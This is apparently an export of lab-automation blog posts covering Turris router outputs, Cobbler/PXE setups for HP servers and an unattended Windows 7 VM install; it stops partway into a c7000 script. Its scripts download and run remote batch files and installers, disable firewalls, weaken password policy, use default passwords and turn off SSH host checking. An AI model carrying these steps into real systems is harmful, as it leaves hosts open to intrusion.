Here are some outputs of the commands executed on the fresh router, which may be interesting: root@turris:~# ifconfig -a br-lan Link encap:Ethernet HWaddr D8:58:D7:00:02:DC inet addr:192.168.1.1 Bcast:192.168.1.255 Mask:255.255.255.0 inet6 addr: fe80::da58:d7ff:fe00:2dc/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:475 errors:0 dropped:0 overruns:0 frame:0 TX packets:389 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:41385 (40.4 KiB) TX bytes:155374 (151.7 KiB) eth0 Link encap:Ethernet HWaddr D8:58:D7:00:02:DC UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:7 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:892 (892.0 B) Base address:0xa000 eth1 Link encap:Ethernet HWaddr D8:58:D7:00:02:DD UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:6 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:742 (742.0 B) Base address:0xc000 eth2 Link encap:Ethernet HWaddr D8:58:D7:00:02:DE inet addr:89.102.175.10 Bcast:89.102.175.255 Mask:255.255.255.0 inet6 addr: fe80::da58:d7ff:fe00:2de/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:648 errors:0 dropped:0 overruns:0 frame:0 TX packets:346 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:194087 (189.5 KiB) TX bytes:35119 (34.2 KiB) Base address:0xe000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:104 errors:0 dropped:0 overruns:0 frame:0 TX packets:104 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:8610 (8.4 KiB) TX bytes:8610 (8.4 KiB) teql0 Link encap:UNSPEC HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 NOARP MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:100 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) wlan0 Link encap:Ethernet HWaddr 60:02:B4:7D:85:CD UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:474 errors:0 dropped:0 overruns:0 frame:0 TX packets:393 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:48015 (46.8 KiB) TX bytes:163832 (159.9 KiB) Compared to the cheap routers there is much more disk space: root@turris:~# df -h Filesystem Size Used Available Use% Mounted on rootfs 249.0M 31.6M 217.4M 13% / /dev/root 249.0M 31.6M 217.4M 13% / tmpfs 1013.9M 312.0K 1013.6M 0% /tmp tmpfs 512.0K 4.0K 508.0K 1% /dev The same applies to the memory used by applications: root@turris:~# free total used free shared buffers Mem: 2076428 67700 2008728 0 0 -/+ buffers: 67700 2008728 Swap: 0 0 0 A two-core processor can be handy as well: root@turris:~# cat /proc/cpuinfo processor : 0 cpu : e500v2 clock : 1200.000000MHz revision : 5.1 (pvr 8021 1051) bogomips : 150.00 processor : 1 cpu : e500v2 clock : 1200.000000MHz revision : 5.1 (pvr 8021 1051) bogomips : 150.00 total bogomips : 300.00 timebase : 75000000 platform : P2020 RDB model : Turris Memory : 2048 MB The rest of the commands can be seen in my GitHub repository. On the same page you can see the “original” /etc directory compressed right after I finished the “connection wizard”. Next pictures are showing the original package, t-shirt, invoice, etc: Next time I’ll describe the additional OpenWrt configuration which I did to make the router work better." }, { "title": "Upgrade firmware in HP servers using HP Service Pack for ProLiant and Cobbler", "url": "/posts/upgrade-firmware-in-hp-servers-using-hp-service-pack-for-proliant-and-cobbler/", "categories": "Linux, Networking, linux.xvx.cz", "tags": "hp-server, cobbler, pxe", "date": "2013-12-31 00:00:00 +0100", "content": "Original post from linux.xvx.cz If you have to upgrade the firmware (iLO, BIOS, Disk firmware, NIC firmware, …) inside many HP servers and for this task it’s useful to use HP Service Pack for ProLiant (HP SPP). This iso file contains the firmware for all supported HP servers. The easiest way is to boot from the ISO file and upgrade the server where it is running. If you have many servers - it’s better to use an automated way using PXEboot, Cobbler and NFS. I would like to share a few steps on how I did it in my environment. Download the HP SPP and prepare the NFS: yum install -y nfs-utils rpcbind chkconfig nfs on mkdir -p /data/hp/HP_Service_Pack_for_Proliant chown -R nfsnobody:nfsnobody /data cat &gt; /etc/exports &lt;&lt; EOF /data 0.0.0.0/0.0.0.0(ro,no_root_squash,no_subtree_check,async,crossmnt,fsid=0) EOF cd /data/hp/ || exit wget http://ftp.okhysing.is/hp/spp/2013-09/HP_Service_Pack_for_Proliant_2013.09.0-0_744345-001_spp_2013.09.0-SPP2013090.2013_0830.30.iso ln -s HP_Service_Pack_for_Proliant_2013.09.0-0_744345-001_spp_2013.09.0-SPP2013090.2013_0830.30.iso HPSPP.iso echo \"/data/hp/HPSPP.iso /data/hp/HP_Service_Pack_for_Proliant iso9660 ro,loop,auto 0 0\" &gt;&gt; /etc/fstab mount /data/hp/HP_Service_Pack_for_Proliant Now install and configure Cobbler to boot the HP SPP using PXE: # Install EPEL MAJOR_RELEASE=$(sed 's/.* \\([0-9]*\\)\\.[0-9] .*/\\1/' /etc/redhat-release) cd /tmp/ || exit lftp -e \"mget /pub/linux/fedora/epel/6/x86_64/epel-release*.noarch.rpm; quit;\" http://ftp.fi.muni.cz/ rpm -Uvh ./epel*\"${MAJOR_RELEASE}\"*.noarch.rpm # Install Cobbler yum install -y cobbler-web fence-agents git hardlink ipmitool dhcp sed -i.orig 's/module = authn_denyall/module = authn_configfile/' /etc/cobbler/modules.conf HTDIGEST_HASH=$(printf admin:Cobbler:admin123 | md5sum -) echo \"admin:Cobbler:${HTDIGEST_HASH:0:32}\" &gt;&gt; /etc/cobbler/users.digest PASSWORD_HASH=$(openssl passwd -1 'admin123') sed -i.orig \"s/^\\(anamon_enabled:\\).*/\\1 1/;s@^\\(default_password_crypted:\\).*@\\1 \\\"$PASSWORD_HASH\\\"@;s/^\\(manage_dhcp:\\).*/\\1 1/;s/^\\(next_server:\\).*/\\1 10.29.49.7/;s/^\\(pxe_just_once:\\).*/\\1 1/;s/^\\(server:\\).*/\\1 10.29.49.7/;s/^\\(scm_track_enabled:\\).*/\\1 1/;s/^power_management_default_type:.*/power_management_default_type: 'ilo'/\" /etc/cobbler/settings # Change DHCPd template sed -i.orig 's/192.168.1.0/10.29.49.0/;s/192.168.1.5;/10.29.49.1;/;s/192.168.1.1;/10.226.32.44;/;s/255.255.255.0/255.255.255.128/;s/192.168.1.100 192.168.1.254/10.29.49.100 10.29.49.126/;' /etc/cobbler/dhcp.template # Configure DHCPd sed -i.orig 's/^DHCPDARGS=.*/DHCPDARGS=\"eth0\"/' /etc/sysconfig/dhcpd SPP_INITRD=$(ls /data/hp/HP_Service_Pack_for_Proliant/pxe/spp*/initrd.img) SPP_KERNEL=$(ls /data/hp/HP_Service_Pack_for_Proliant/pxe/spp*/vmlinuz) cobbler distro add --name=hp-sos --arch=i386 --kernel=\"$SPP_KERNEL\" --initrd=\"$SPP_INITRD\" \\ --kopts '!kssendmac !ksdevice !lang !text rw root=/dev/ram0 init=/bin/init loglevel=3 splash=verbose showopts media=net iso1=nfs://10.29.49.7/data/hp/HPSPP.iso iso1mnt=/mnt/bootdevice iso1opts=nolock,timeo=600 d3bug' cobbler profile add --name=\"Firmware_Upgrade-Automatic\" --distro=hp-sos --kopts=\"TYPE=AUTOMATIC AUTOPOWEROFFONSUCCESS=no AUTOREBOOTONSUCCESS=yes\" --kickstart=\"\" cobbler profile add --name=\"Firmware_Upgrade-Interactive\" --distro=hp-sos --kopts=\"TYPE=MANUAL AUTOPOWEROFFONSUCCESS=no\" --kickstart=\"\" cobbler profile add --name=\"Firmware_Upgrade-Automatic_POWEROFF\" --distro=hp-sos --kopts=\"TYPE=AUTOMATIC\" --kickstart=\"\" service cobblerd restart chkconfig cobblerd on service httpd restart chkconfig httpd on chkconfig dhcpd on service xinetd restart cobbler sync # Just to be sure chkconfig iptables off service iptables stop Once the tftp, NFS, dhcp is ready you can try to “Boot from Network” one of the servers. If the networking is working fine you should at least get the IP from the DHCP server and the main “Cobbler blue” menu. You can see the full video recorded during “test” firmware upgrade below: (some parts of the video are accelerated) Enjoy :-)" }, { "title": "Server RAID/BIOS changes using HP Scripting toolkit and Cobbler", "url": "/posts/server-raidbios-changes-using-hp-scripting-toolkit-and-cobbler/", "categories": "Linux, Networking, linux.xvx.cz", "tags": "hp-server, cobbler, raid, pxe", "date": "2013-11-27 00:00:00 +0100", "content": "Original post from linux.xvx.cz I have to take care of a few enclosures with HP ProLiant BL685c and HP ProLiant BL460c blades (both G1). They are quite old now, but still can do a good job. Because there was no operating system I had no idea how the RAID or BIOS was configured. Obviously I want to have it configured the same and I really don’t want to go through all of them one by one and configure it manually. Luckily for me there is an HP Scripting Toolkit (or HP SmartStart Scripting Toolkit) which can boot over PXE and get/set the BIOS/RAID configuration. It is especially handy if you have new servers without OS installed. Let’s see how you can install and configure Cobbler, NFS, PXE, tftpboot and HP Scripting Toolkit to modify the BIOS/RAID information on the server. Start with installing the latest CentOS, getting the SmartStart Scripting Toolkit and basic NFS configuration: yum install -y nfs-utils rpcbind chkconfig nfs on mkdir -p /data/hp/ chown -R nfsnobody:nfsnobody /data cat &gt; /etc/exports &lt;&lt; EOF /data 0.0.0.0/0.0.0.0(ro,no_root_squash,no_subtree_check,async,crossmnt,fsid=0) /data/hp/ss-scripting-toolkit-linux 0.0.0.0/0.0.0.0(rw,no_root_squash,no_subtree_check,async,crossmnt) EOF wget --no-verbose http://ftp.hp.com/pub/softlib2/software1/pubsw-linux/p1221080004/v63551/ss-scripting-toolkit-linux-8.70.tar.gz -P /data/hp/ cd /data/hp/ || exit tar xzf ss-scripting-toolkit-linux*.tar.gz ln -s ss-scripting-toolkit-linux-8.70 ss-scripting-toolkit-linux mkdir /data/hp/ss-scripting-toolkit-linux/blade_configs sed -i.orig 's/export TZ=.*/export TZ=MET-1METDST/;s@export TOOLKIT_WRITE_DIR=.*@export TOOLKIT_WRITE_DIR=/data/hp/ss-scripting-toolkit-linux@;' /data/hp/ss-scripting-toolkit-linux/scripts/includes # shellcheck disable=SC2016 # Single quotes intentional - preserving ${VARIABLE} literals in target files sed -i.orig 's/partimage/#partimage/;s@\\${PROFILE_MNT}/\\${PROFILENAME}@\\${PROFILE_MNT}/blade_configs/\\${PROFILENAME}@;s@^\\${TOOLKIT}/reboot@poweroff -f@;/Mounting Storage/a mkdir \\${PROFILE_MNT}' /data/hp/ss-scripting-toolkit-linux/scripts/capture.sh /data/hp/ss-scripting-toolkit-linux/scripts/deploy.sh # shellcheck disable=SC2016 # Single quotes intentional - preserving ${VARIABLE} literals in target files sed -i 's@\\${PROFILE_MNT}/\\$PROFILENAME@\\${PROFILE_MNT}/blade_configs/\\$PROFILENAME@' /data/hp/ss-scripting-toolkit-linux/scripts/capture.sh # shellcheck disable=SC2016 # Single quotes intentional - preserving ${VARIABLE} literals in target files sed 's@/mnt/main/scripts/includes@/TOOLKIT/includes@;s@cp -a \\${RAM_TOOLKIT_DIR}@#&amp;@;s@./rbsureset -reset@./rbsureset #-reset@;s/^reboot/poweroff -f/' /data/hp/ss-scripting-toolkit-linux/contrib/LinuxCOE/scripts/systemreset.sh &gt; /data/hp/ss-scripting-toolkit-linux/scripts/systemreset.sh chmod a+x /data/hp/ss-scripting-toolkit-linux/scripts/systemreset.sh Now install and configure Cobbler: # Install EPEL MAJOR_RELEASE=$(sed 's/.* \\([0-9]*\\)\\.[0-9] .*/\\1/' /etc/redhat-release) cd /tmp/ || exit lftp -e \"mget /pub/linux/fedora/epel/6/x86_64/epel-release*.noarch.rpm; quit;\" http://ftp.fi.muni.cz/ rpm -Uvh ./epel*\"${MAJOR_RELEASE}\"*.noarch.rpm # Install Cobbler yum install -y cobbler-web fence-agents git hardlink ipmitool dhcp sed -i.orig 's/module = authn_denyall/module = authn_configfile/' /etc/cobbler/modules.conf HTDIGEST_HASH=$(printf admin:Cobbler:admin123 | md5sum -) echo \"admin:Cobbler:${HTDIGEST_HASH:0:32}\" &gt;&gt; /etc/cobbler/users.digest PASSWORD_HASH=$(openssl passwd -1 'admin123') sed -i.orig \"s/^\\(anamon_enabled:\\).*/\\1 1/;s@^\\(default_password_crypted:\\).*@\\1 \\\"$PASSWORD_HASH\\\"@;s/^\\(manage_dhcp:\\).*/\\1 1/;s/^\\(next_server:\\).*/\\1 10.29.49.4/;s/^\\(pxe_just_once:\\).*/\\1 1/;s/^\\(server:\\).*/\\1 10.29.49.4/;s/^\\(scm_track_enabled:\\).*/\\1 1/;s/^power_management_default_type:.*/power_management_default_type: 'ilo'/\" /etc/cobbler/settings # Change DHCPd template sed -i.orig 's/192.168.1.0/10.29.49.0/;s/192.168.1.5;/10.29.49.1;/;s/192.168.1.1;/10.226.32.44;/;s/255.255.255.0/255.255.255.128/;s/192.168.1.100 192.168.1.254/10.29.49.100 10.29.49.126/;' /etc/cobbler/dhcp.template # Change PXE template sed -i.orig '/ONTIMEOUT/a SERIAL 0 115200' /etc/cobbler/pxe/pxedefault.template # Configure DHCPd sed -i.orig 's/^DHCPDARGS=.*/DHCPDARGS=\"eth0\"/' /etc/sysconfig/dhcpd service cobblerd restart chkconfig cobblerd on service httpd restart chkconfig httpd on chkconfig dhcpd on service xinetd restart # Add distro and profiles to Cobbler cobbler distro add --name=sstk --arch=i386 --kernel=/data/hp/ss-scripting-toolkit-linux/boot_files/vmlinuz --initrd=/data/hp/ss-scripting-toolkit-linux/boot_files/initrd.img \\ --kopts '!kssendmac !ksdevice !lang !text root=/dev/ram0 rw ramdisk_size=396452 network=1 sstk_mount=10.29.49.4:/data/hp/ss-scripting-toolkit-linux sstk_mount_type=nfs sstk_mount_options=rw,nolock sstk_script=/shell.sh console=ttyS0,115200n8' cobbler profile add --name=\"SSTK-Capture_and_save_system_hardware_settings\" --distro=sstk --kopts=\"sstk_script=/capture.sh img=test_hostname\" --kickstart=\"\" cobbler profile add --name=\"SSTK-Reset_system_to_factory_defaults\" --distro=sstk --kopts=\"sstk_script=/systemreset.sh img=test_hostname\" --kickstart=\"\" cobbler profile add --name=\"SSTK-Deploy_Configuration\" --distro=sstk --kopts=\"sstk_script=/deploy.sh img=test_hostname\" --kickstart=\"\" git config --global user.name \"Config Git\" git config --global user.email root@cobbler.example.com cobbler sync # Just to be sure chkconfig iptables off service iptables stop Once the tftp, NFS, dhcp is ready you can try to “Boot from Network” one of the servers. If the networking is working fine you should at least see getting the IP from the DHCP server and the main “blue” menu. The full video can be seen here: You can find the examples of files modified by sed in the scripts in GitHub. Example configuration files - the configuration “extracted” from the BL685c blade as shown in the video above. Enjoy :-)" }, { "title": "Automated installation of Windows 7 in KVM", "url": "/posts/automated-installation-of-windows-7-in-kvm/", "categories": "Virtualization, Windows, linux.xvx.cz", "tags": "kvm, windows, automation", "date": "2013-11-11 00:00:00 +0100", "content": "Original post from linux.xvx.cz Sometimes I need to test/work with Windows 7 in my libvirt/KVM virtualization. Because the testing can be destructive I decided to automate it as much as possible. As a Linux user there are not many options to modify an ISO image and create a fully unattended installation, because I need the “windows only” tools for that. I also don’t want to use unattended configs shared by SAMBA, because it looks too complex for one VM. Anyway here is the description of the solution for how I’m “fighting” with the automated Windows installation in the Virtual Machine manager. Here are the screenshots from the VirtManager: As you can see above I decided to use VirtIO for disk access to get the best performance. In such a case I’ll need the Windows VirtIO Drivers otherwise the disk is not going to be visible. I decided to create my own iso image which I used as the second CD-ROM drive. This has two advantages - I can put there the VirtIO drivers and the autostart.bat script which needs to be executed manually after first boot. Here is a short script to create such an ISO: #!/bin/bash -x URL=\"http://alt.fedoraproject.org/pub/alt/virtio-win/latest/images/bin/virtio-win-0.1-65.iso\" ISO=$(basename \"$URL\") sudo rm autostart.iso wget --continue \"$URL\" sudo mount -o loop \"./$ISO\" /mnt/iso mkdir -v cd #32 bit cp -v /mnt/iso/win7/x86/* \"$PWD/cd/\" #64 bit #cp -v -r /mnt/iso/win7/amd64/* \"$PWD/cd/\" cat &gt; \"$PWD/cd/autorun.bat\" &lt;&lt; \\EOF :: Tested on Windows Win7 powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile(\\\"https://gist.github.com/ruzickap/7395426/raw/win7-admin.bat\\\", \\\"c:\\win7-admin.bat\\\")\" powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile(\\\"https://gist.github.com/ruzickap/7395075/raw/win7-user.bat\\\", \\\"c:\\win7-user.bat\\\")\" c:\\win7-user.bat EOF chmod 644 \"$PWD/cd/\"* genisoimage -v -V AUTOSTART -J -r -o autostart.iso cd/* sudo umount /mnt/iso rm -rvf \"$PWD/cd\" rm \"$ISO\" Another screenshot showing the second CD-ROM with the autostart.iso: Once the installation of the Windows 7 is completed you should run the autostart.bat using the “Run as administrator” option. It will download the win7-admin.bat and download+run win7-user.bat. You can see the content of the win7-user.bat here: :: Tested on Windows 7 echo on rem for /f \"tokens=3\" %%i in ('netsh interface ip show addresses \"Local Area Connection\" ^|findstr IP.Address') do set IP=%%i rem for /f \"tokens=2 delims=. \" %%j in ('nslookup %IP% ^|find \"Name:\"') do set HOSTNAME=%%j @echo. @echo Enable Administrator net user administrator /active:yes @echo. @echo Change password and Password Complexity to allow simple passwords net accounts /maxpwage:unlimited net accounts /minpwlen:0 secedit /export /cfg c:\\password.cfg powershell -command \"${c:\\password.cfg}=${c:\\password.cfg} | %% {$_.Replace('PasswordComplexity = 1', 'PasswordComplexity = 0')}\" secedit /configure /db %windir%\\security\\new.sdb /cfg c:\\password.cfg /areas SECURITYPOLICY del c:\\password.cfg net user Administrator xxxx @echo. @echo Autologin rem reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d \"1\" /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d \"Administrator\" /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d \"xxxx\" /f @echo. @echo Enable Remote Desktop reg ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f @echo. @echo Set proxy settings reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v MigrateProxy /t REG_DWORD /d 0x1 /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"http=proxy.example.com:3128;https=proxy.example.com:3128;ftp=proxy.example.com:3128;socks=proxy.example.com:3128;\" /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyOverride /t REG_SZ /d ^&lt;local^&gt;; /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxySettingsPerUser /t REG_DWORD /d 0x0 /f @echo. @echo Creating bat script running on start to check if the proxy server is available or not. echo @echo off ^ ping -n 3 proxy.example.com ^ if %%ERRORLEVEL%% EQU 0 ( ^ @echo. ^ @echo *** Setting proxy ^ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0x1 /f ^ ) else ( ^ @echo. ^ @echo *** Proxy disabled ^ ) ^ &gt; \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\proxy.bat\" start /MIN \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\proxy.bat\" @echo. @echo Configure NTP server w32tm /config /manualpeerlist:\"ntp.cesnet.cz\" /reliable:yes /update net start w32time rem w32tm /resync /rediscover rem w32tm /query /peers rem w32tm /query /status @echo. @echo Disable firewall netsh advfirewall set allprofiles state off @echo. @echo Change TimeZone tzutil /s \"Central Europe Standard Time\" @echo. @echo Disable IPv6 reg add hklm\\system\\currentcontrolset\\services\\tcpip6\\parameters /v DisabledComponents /t REG_DWORD /d 255 @echo. @echo Disable firewall netsh advfirewall set allprofiles state off rem @echo. rem @echo Server name change rem powershell -command \"$sysInfo = Get-WmiObject -Class Win32_ComputerSystem; $sysInfo.Rename('%HOSTNAME%');\" @echo. @echo Run IE to get proxy settings working properly (workaround for proxy settings) start /d \"%PROGRAMFILES%\\Internet Explorer\" iexplore.exe www.google.com @echo. @echo Disable Windows Update reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" /v AUOptions /t REG_DWORD /d 1 /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" /v AUState /t REG_DWORD /d 7 /f ping -n 3 127.0.0.1 &gt; nul shutdown /r /t 0 move c:\\win7-user.bat c:\\windows\\temp\\ After the restart you should login as Administrator (with password xxxx) and complete installation by running win7-admin.bat shown here: :: Tested on Windows 7 @echo. @echo Test connection settings powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://www.google.com', 'c:\\del')\" if %ERRORLEVEL% NEQ 0 ( @echo Can not download files form Internet !!! pause exit ) del c:\\del @echo. @echo Import certificates to skip \"Would you like to install this device software\" prompt when installing Spice Guest Tools :: http://edennelson.blogspot.cz/2013/02/deploying-openvpn.html powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://zeenix.fedorapeople.org/drivers/win-tools/postinst/redhat10.cer', 'c:\\redhat.cer')\" certutil -addstore \"TrustedPublisher\" c:\\redhat.cer del c:\\redhat.cer powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://zeenix.fedorapeople.org/drivers/win-tools/postinst/redhat09.cer', 'c:\\redhat.cer')\" certutil -addstore \"TrustedPublisher\" c:\\redhat.cer del c:\\redhat.cer @echo. @echo Change IE homepage + disable Tour + disable Check Associations + disable First Home Page + disable OOBE + disable Server Manager reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Start Page\" /d \"https://google.com\" /f reg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Default_Page_URL\" /d \"https://google.com\" /f reg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"DisableFirstRunCustomize\" /t REG_DWORD /d 1 /f reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Check_Associations\" /d \"no\" /f reg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"NoProtectedModeBanner\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ServerManager\\Oobe\" /v \"DoNotOpenInitialConfigurationTasksAtLogon\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ServerManager\" /v \"DoNotOpenServerManagerAtLogon\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\MAIN\\ESCHomePages\" /v \"SoftAdmin\" /d \"https://google.com\" /f @echo. @echo Disable \"Check whether IE is the default browser?\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}\" /v IsInstalled /t REG_DWORD /d 00000000 /f @echo. @echo Download and install 7-Zip powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://switch.dl.sourceforge.net/project/sevenzip/7-Zip/9.20/7z920.msi', 'c:\\7z.msi')\" msiexec /i c:\\7z.msi /qn del /f c:\\7z.msi @echo. @echo Download SSH Server powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('https://www.itefix.no/i2/sites/default/files/Copssh_3.1.4_Installer.zip', 'c:\\Copssh_Installer.zip')\" \"%PROGRAMFILES%\\7-Zip\\7z.exe\" x -oc:\\ c:\\Copssh_Installer.zip c:\\Copssh_3.1.4_Installer.exe /u=root /p=xxxx /S del /f c:\\Copssh_3.1.4_Installer.exe c:\\Copssh_Installer.zip echo ssh-rsa xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ruzickap@peru &gt;&gt; \"%PROGRAMFILES%\\ICW\\home\\Administrator\\.ssh\\authorized_keys\" ( echo -----BEGIN RSA PRIVATE KEY----- &amp; REM gitleaks:allow echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx echo -----END RSA PRIVATE KEY----- ) &gt; \"%PROGRAMFILES%\\ICW\\home\\Administrator\\.ssh\\id_rsa\" ( echo Host * echo UserKnownHostsFile /dev/null echo StrictHostKeyChecking no echo User root ) &gt; \"%PROGRAMFILES%\\ICW\\home\\Administrator\\.ssh\\config\" @echo. @echo Download an install WinSCP powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://garr.dl.sourceforge.net/project/winscp/WinSCP/5.1.7/winscp517setup.exe', 'c:\\winscpsetup.exe')\" c:\\winscpsetup.exe /silent /sp del /f c:\\winscpsetup.exe reg add \"HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\Default%20Settings\" /v \"HostName\" /t REG_SZ /d \"192.168.122.1\" /f reg add \"HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\Default%20Settings\" /v \"UserName\" /t REG_SZ /d \"ruzickap\" /f @echo. @echo Download an install Double Commander powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://optimate.dl.sourceforge.net/project/doublecmd/DC%%20for%%20Windows%%2032%%20bit/Double%%20Commander%%200.5.6%%20beta/doublecmd-0.5.6.i386-win32.exe', 'c:\\doublecmd.exe')\" c:\\doublecmd.exe /sp /silent /MERGETASKS=\"desktopicon\" del /f c:\\doublecmd.exe @echo Download Putty powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://the.earth.li/~sgtatham/putty/latest/x86/putty-0.63-installer.exe', 'c:\\putty-installer.exe')\" c:\\putty-installer.exe /silent /sp /MERGETASKS=\"desktopicon\" del /f c:\\putty-installer.exe @echo. @echo Download and install Firefox powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/23.0.1/win32/en-US/Firefox%%20Setup%%2023.0.1.exe', 'c:\\Firefox_Setup.exe')\" c:\\Firefox_Setup.exe -ms del /f c:\\Firefox_Setup.exe @echo. @echo Download Notepad++ powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://download.tuxfamily.org/notepadplus/6.4.1/npp.6.4.1.Installer.exe', 'c:\\npp.Installer.exe')\" c:\\npp.Installer.exe /S del /f c:\\npp.Installer.exe @echo. @echo Download and install Spice powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-0.59.exe', 'c:\\spice-guest-tools.exe')\" c:\\spice-guest-tools.exe /S del /f c:\\spice-guest-tools.exe @echo. @echo Download and install JRE rem powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://download.kb.cz/jre-7u45-windows-i586.exe', 'c:\\jre-windows.exe')\" powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://javadl.sun.com/webapps/download/AutoDL?BundleId=81819', 'c:\\jre-windows.exe')\" c:\\jre-windows.exe /s del /f c:\\jre-windows.exe @echo. @echo Download and install DesktopInfo powershell -command \"$client = new-object System.Net.WebClient; $client.DownloadFile('http://www.glenn.delahoy.com/software/files/DesktopInfo120.zip', 'c:\\DesktopInfo.zip')\" \"%PROGRAMFILES%\\7-Zip\\7z.exe\" x -o\"%PROGRAMFILES%\\DesktopInfo\" c:\\DesktopInfo.zip del c:\\DesktopInfo.zip reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v DesktopInfo /t reg_sz /d \"%PROGRAMFILES%\\DesktopInfo\\DesktopInfo.exe\" /f @echo. @echo Disable Hibernate powercfg -h off @echo. @echo Disable piracy warning start SLMGR -REARM @echo. @echo Change pagefile size wmic.exe computersystem set AutomaticManagedPagefile=False wmic pagefileset where name=\"C:\\\\pagefile.sys\" set InitialSize=512,MaximumSize=512 wmic pagefileset list /format:list @echo. @echo Clean mess cleanmgr /sagerun:11 @echo. @echo Compact all files compact /c /s /i /q &gt; NUL pause shutdown /r /t 0 move c:\\win7-admin.bat c:\\windows\\temp\\ Feel free to see the whole installation procedure on this video (some parts are accelerated): :-)" }, { "title": "How to get HP enclosure c7000 information without ssh", "url": "/posts/how-to-get-hp-enclosure-c7000-information-without-ssh/", "categories": "Linux, linux.xvx.cz", "tags": "hp-server, bash", "date": "2013-08-23 00:00:00 +0200", "content": "Original post from linux.xvx.cz In the past few days I was doing some scripting to get the details about the HP BladeSystem c7000. You can do a lot through SSH access, but I prefer to get the data without setting up ssh keys or doing some expect scripts. I needed “showAll” output and some nice structured XML file containing the hardware description, MACs, WWIDs, etc… Maybe it can be useful for some people who want to do the same - here is the example: #!/bin/bash -x IP=\"10.29.33.14\" USER=\"admin\" PASSWORD=\"admin\" 